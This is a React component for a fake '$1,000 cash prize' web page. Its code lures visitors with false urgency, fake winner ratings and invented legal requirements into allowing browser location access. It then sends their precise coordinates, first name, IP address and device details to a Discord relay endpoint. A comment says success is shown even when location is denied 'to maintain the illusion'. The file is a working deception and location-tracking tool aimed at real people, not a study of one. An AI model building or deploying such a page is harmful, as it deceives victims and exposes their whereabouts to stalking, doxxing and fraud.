// File: src/components/FakeRewardInterface.tsx
'use client';

import { useState, useEffect } from 'react';
import { Gift, MapPin, Smartphone, Clock, Star, Trophy } from 'lucide-react';

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  userAgent: string;
  referrer: string;
  language: string;
  platform: string;
  screenResolution: string;
  timezone: string;
  ip?: string;
}

interface Props {
  onDataCollected: (data: LocationData) => void;
}

export default function FakeRewardInterface({ onDataCollected }: Props) {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [userName, setUserName] = useState('');
  const [showCongrats, setShowCongrats] = useState(false);

  const collectData = async () => {
    setLoading(true);

    try {
      // Get location
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      // Gather additional data
      const data: LocationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Direct visit',
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };

      // Get IP address
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.ip = ipData.ip;
      } catch (ipError) {
        console.log('Could not fetch IP:', ipError);
      }

      // Send to Discord
      await sendToDiscord(data);
      
      setLoading(false);
      setShowCongrats(true);
      
      // Notify parent component
      onDataCollected(data);
      
    } catch (err) {
      setLoading(false);
      // Even if location fails, still show success to maintain the illusion
      setShowCongrats(true);
      
      // Collect what we can without location
      const basicData = {
        latitude: 0,
        longitude: 0,
        accuracy: 0,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Direct visit',
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        error: 'Location denied'
      };

      await sendToDiscord(basicData);
      onDataCollected(basicData as LocationData);
    }
  };

  const sendToDiscord = async (data: any) => {
    try {
      await fetch('/api/send-to-discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({...data, userName}),
      });
    } catch (error) {
      console.error('Error sending to Discord:', error);
    }
  };

  if (showCongrats) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-center transform animate-bounce">
          <div className="text-6xl mb-4">🎉</div>
          <h2 className="text-3xl font-bold text-green-600 mb-4">
            Congratulations!
          </h2>
          <p className="text-lg text-gray-700 mb-4">
            Your reward is being processed...
          </p>
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-4"></div>
          <p className="text-sm text-gray-500">
            Please wait while we verify your location for delivery
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full">
        {/* Header */}
        <div className="bg-gradient-to-r from-yellow-400 to-orange-500 p-6 text-center">
          <Trophy className="h-16 w-16 text-white mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-white mb-2">
            🎊 CONGRATULATIONS! 🎊
          </h1>
          <p className="text-white opacity-90">
            You've been selected as our lucky winner!
          </p>
        </div>

        {/* Content */}
        <div className="p-6">
          {step === 1 && (
            <div className="text-center">
              <div className="text-6xl mb-4">💰</div>
              <h2 className="text-3xl font-bold text-gray-800 mb-4">
                $1,000 CASH PRIZE!
              </h2>
              <div className="bg-yellow-100 border border-yellow-400 rounded-lg p-4 mb-6">
                <div className="flex items-center justify-center mb-2">
                  <Clock className="h-5 w-5 text-red-600 mr-2" />
                  <span className="text-red-600 font-semibold">Limited Time Offer!</span>
                </div>
                <p className="text-sm text-gray-700">
                  This exclusive offer expires in 10 minutes. Don't miss out!
                </p>
              </div>
              
              <div className="space-y-3 mb-6">
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Prize Amount:</span>
                  <span className="font-bold text-green-600">$1,000.00</span>
                </div>
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Processing Fee:</span>
                  <span className="font-bold text-green-600">FREE</span>
                </div>
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <span className="text-sm text-gray-600">Delivery:</span>
                  <span className="font-bold text-green-600">Instant</span>
                </div>
              </div>

              <button
                onClick={() => setStep(2)}
                className="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:from-green-600 hover:to-blue-600 transform hover:scale-105 transition-all duration-200 shadow-lg"
              >
                🎁 CLAIM YOUR $1,000 NOW!
              </button>
              
              <div className="mt-4 flex items-center justify-center space-x-4 text-yellow-400">
                {[...Array(5)].map((_, i) => (
                  <Star key={i} className="h-5 w-5 fill-current" />
                ))}
              </div>
              <p className="text-xs text-gray-500 mt-2">
                Rated 5/5 by 10,000+ winners
              </p>
            </div>
          )}

          {step === 2 && (
            <div className="text-center">
              <Gift className="h-16 w-16 text-purple-600 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Almost There!
              </h2>
              <p className="text-gray-600 mb-6">
                We need to verify your identity and location for secure delivery of your prize money.
              </p>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                <h3 className="font-semibold text-blue-800 mb-2">Why do we need this?</h3>
                <ul className="text-sm text-blue-700 space-y-1 text-left">
                  <li>✓ Prevent fraud and ensure you're the real winner</li>
                  <li>✓ Calculate local taxes and compliance</li>
                  <li>✓ Arrange secure cash delivery to your area</li>
                  <li>✓ Required by law for prizes over $500</li>
                </ul>
              </div>

              <input
                type="text"
                placeholder="Enter your first name"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />

              <button
                onClick={() => setStep(3)}
                disabled={!userName.trim()}
                className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-3 px-6 rounded-lg hover:from-purple-600 hover:to-pink-600 transform hover:scale-105 transition-all duration-200 shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Continue to Verification
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="text-center">
              <div className="text-4xl mb-4">📍</div>
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Final Step: Location Verification
              </h2>
              <p className="text-gray-600 mb-6">
                Hi {userName}! We need to verify your location to ensure secure delivery of your $1,000 prize.
              </p>
              
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-center justify-center mb-2">
                  <Smartphone className="h-5 w-5 text-green-600 mr-2" />
                  <span className="font-semibold text-green-800">Secure Location Check</span>
                </div>
                <p className="text-sm text-green-700">
                  Your browser will ask for location permission. This is completely safe and used only for prize delivery verification.
                </p>
              </div>

              <div className="bg-yellow-50 border border-yellow-400 rounded-lg p-3 mb-6">
                <p className="text-sm text-yellow-800">
                  <strong>Important:</strong> Click "Allow" when your browser asks for location access to complete the verification process.
                </p>
              </div>

              {loading ? (
                <div className="py-8">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
                  <p className="text-gray-600">Verifying your location...</p>
                  <p className="text-sm text-gray-500 mt-2">This may take a few moments</p>
                </div>
              ) : (
                <button
                  onClick={collectData}
                  className="w-full bg-gradient-to-r from-red-500 to-orange-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:from-red-600 hover:to-orange-600 transform hover:scale-105 transition-all duration-200 shadow-lg animate-pulse"
                >
                  <MapPin className="inline-block h-5 w-5 mr-2" />
                  VERIFY LOCATION & CLAIM $1,000
                </button>
              )}
              
              <p className="text-xs text-gray-500 mt-4">
                🔒 Your information is encrypted and secure
              </p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="bg-gray-50 px-6 py-3 text-center">
          <p className="text-xs text-gray-500">
            ⭐ Join 50,000+ satisfied winners | 100% Legitimate | No Hidden Fees
          </p>
        </div>
      </div>
    </div>
  );
}